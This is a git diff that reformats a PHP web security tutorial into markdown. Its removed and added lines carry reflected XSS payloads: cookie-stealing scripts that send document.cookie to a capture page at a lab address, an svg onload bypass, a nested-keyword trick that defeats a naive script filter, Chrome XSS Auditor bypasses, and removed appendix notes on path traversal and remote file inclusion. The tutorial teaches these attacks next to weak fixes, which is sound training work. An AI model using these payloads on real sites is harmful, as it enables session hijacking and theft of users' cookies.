@@ -338,92 +338,107 @@ Payload:
 - lastname:	`Doe<script>alert(document.cookie)</script>`
 - Output: `Hello John Doe[ ... popup appears saying "PHPSESSID=badf00d..." ... ]!`
 
-Read GET parameters - EXPLOIT
-XSS Reflected
+## XSS Reflected - injecting and executing javascript
+
 Reading cookies is cool! But what about making the page perform some action?
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe<script>window.location='www.google.it'</script>
-Output: 		Hello John Doe[ redirect to www.google.it ]	
 
-Read GET parameters - EXPLOIT
-XSS Reflected
-Session Hijack (stealing cookies)
-I could send my* cookies somewhere!   *Cookies may actually not be mine.
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
+Code: 			
+```$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
 Payload:
-firstname:		John
-lastname:		Doe<script> window.location='http://192.168.33.10/support				/capture_page.php?' + document.cookie; </script>
-Output: 		Hello John Doe[ redirect to http://192.168.33.10, while sending the Cookie ]				REMEMBER: GET requests send parameters too
 
-Read GET parameters - EXPLOIT
-XSS Reflected
-Session Hijack (covert)
+- firstname: `John`
+- lastname:	`Doe<script>window.location='www.google.it'</script>`
+- Output: `Hello John Doe[ redirect to www.google.it ]`
+
+## XSS Reflected - Session Hijacking (stealing cookies)
+
+Send cookies somewhere!   
+Code:
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+Payload:
+
+- firstname: `John`
+- lastname:	`Doe<script> window.location='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
+Output: `Hello John Doe[ redirect to http://192.168.33.10, while sending the Cookie ]`
+
+
+## XSS Reflected - Session Hijacking (covert)
+
 But can't we do it without redirection?
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe<script> new Image().src='http://192.168.33.10/support				/capture_page.php?' + document.cookie; </script>
-Output: 		Hello John Doe[ broken image link ]!				Browsers automatically perform GET requests to “src” URLs!!
 
-Read GET parameters - FIX
+Code: 			
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+Payload:
+
+- firstname: `John`
+- lastname:	`Doe<script> new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
+Output: `Hello John Doe[ broken image link ]! 
+
+Browsers automatically perform GET requests to `src` URLs!!
+
+## XSS Reflected - FIX
+
 Block <script> tags
-We could just remove the “script” tags, so that no JavaScript code can be executed!
-Code: 			$firstname = preg_replace("/script/i", "", $_POST['firstname']);				$lastname = preg_replace("/script/i", "", $_POST['lastname']);				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe<script> new Image().src='http://192.168.33.10/support				/capture_page.php?' + document.cookie; </script>
-Output: 		Hello John Doe<>new Image().src='http://192.168.33.10/support				/capture_page.php?' + document.cookie;!
 
-Read GET parameters - EXPLOIT
-XSS Reflected - Bypass <script> tags block
-Can we ONLY insert JavaScript code in <script> tags?
-Not ONLY that: HTML elements have on* attributes (onload, onerror, … )
-Code: 			$firstname = preg_replace("/script/i", "", $_POST['firstname']);				$lastname = preg_replace("/script/i", "", $_POST['lastname']);				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe<svg onload=”new Image().src='http://192.168.33.10/support				/capture_page.php?' + document.cookie”></svg>
-Output: 		Hello John Doe [ broken image link ]!				Just like before!
+We could just remove the "script" tags, so that no JavaScript code can be executed!
 
-Read GET parameters - FIX
-XSS Reflected - Chrome XSS Auditor
-Why did we have to work on Firefox? Can't we work on Chrome?
-Code: 			$firstname = preg_replace("/script/i", "", $_POST['firstname']);				$lastname = preg_replace("/script/i", "", $_POST['lastname']);				echo “Hello $firstname $lastname!”;
+Code: 			
+```
+$firstname = preg_replace("/script/i", "", $_POST['firstname']);
+$lastname = preg_replace("/script/i", "", $_POST['lastname']);
+echo “Hello $firstname $lastname!”;
+```
 Payload:
-firstname:		John
-lastname:		Doe<svg onload=”new Image().src='http://192.168.33.10/support				/capture_page.php?' + document.cookie”></svg>
-Output: 		Hello John Doe!		[ script blocked in Console ]				Scripts found in GET parameters are blocked! Are we done then?
 
-Read GET parameters - EXPLOIT
-XSS Reflected - Bypassing Chrome XSS Auditor
+- firstname: `John`
+- lastname:	`Doe<script> new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie; </script>`
+- Output: `Hello John Doe<>new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie;!`
+
+## XSS Reflected - Chrome XSS Auditor
+Why did we have to work on Firefox? Can't we work on Chrome?
+
+Code:
+```
+$firstname = preg_replace("/script/i", "", $_POST['firstname']);
+$lastname = preg_replace("/script/i", "", $_POST['lastname']);
+echo “Hello $firstname $lastname!”;
+```
+Payload:
+
+- firstname: `John`
+- lastname:	`Doe<svg onload=”new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie”></svg>`
+- Output: `Hello John Doe! [ script blocked in Console ]`
+
+Scripts found in GET parameters are blocked! Are we done then?
+
+## XSS Reflected - Bypassing Chrome XSS Auditor
+
 Chrome only checks if a parameter appears in the HTML Body too
+
 If it appears in a parameter and in the body, Chrome blocks its execution
-Code: 			$firstname = preg_replace("/script/i", "", $_POST['firstname']);				$lastname = preg_replace("/script/i", "", $_POST['lastname']);				echo “Hello $firstname $lastname!”;
+
+Code: 			
+```
+$firstname = preg_replace("/script/i", "", $_POST['firstname']);
+$lastname = preg_replace("/script/i", "", $_POST['lastname']);
+echo “Hello $firstname $lastname!”;
+```
 Payload:
-firstname:		John
-lastname:		Doe<svscriptg onlscriptoad=”new Image().src='http://192.168.33.10				/support/capture_page.php?' + document.cookie”></svscriptg>
-Output: 		Hello John Doe [ broken image link ]!				Scripts are not the same!! (php modified it) so Chrome renders it
 
-Read GET parameters - EXPLOIT
-XSS Reflected - Bypassing Chrome XSS Auditor
-Chrome only checks if a parameter appears in the HTML Body too
-It checks for each parameter, but doesn't cross-check! ( … bad pun intended)
-Code: 			$firstname = $_POST['firstname'];	  // removing script is useless … 				$lastname = $_POST['lastname'];	  // no need for it now				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John<svg onload=”
-lastname:		alert('gotcha!')”>Doe
-Output: 		Hello John[ … popup saying “gotcha!” …  ]Doe!				Each parameter is checked on its own! No match = rendered
+- firstname: `John`
+- lastname:	 `Doe<svscriptg onlscriptoad=”new Image().src='http://192.168.33.10/support/capture_page.php?' + document.cookie”></svscriptg>
+- Output: `Hello John Doe [ broken image link ]!
 
+Scripts are not the same!! (php modified it) so Chrome renders it
 
-APPENDIX A - Information Gathering
-Path Traversal
-http://www.mysite.it/index.php?page=contacts
-Code: 		// index.php				<?php					require_once __DIR__.“/pages/”.$_GET['page'];
-Output: 		<html>				<head> <title>Our Contacts</title> </head>				<body>...</body>			</html>
-
-APPENDIX A - Information Gathering
-RFI - Remote File Inclusion
-http://www.mysite.it/index.php?page=PD9waHAgZWNobyAnYWxsb3dfdXJsX2luY2x1ZGUgaXMgYmFkJzs=
-Code: 		// index.php				<?php					require_once __DIR__.“/pages/”.$_GET['page'];
-Output: 		<html>				<head> <title>Our Contacts</title> </head>				<body>...</body>			</html>allow_url_include must be ON
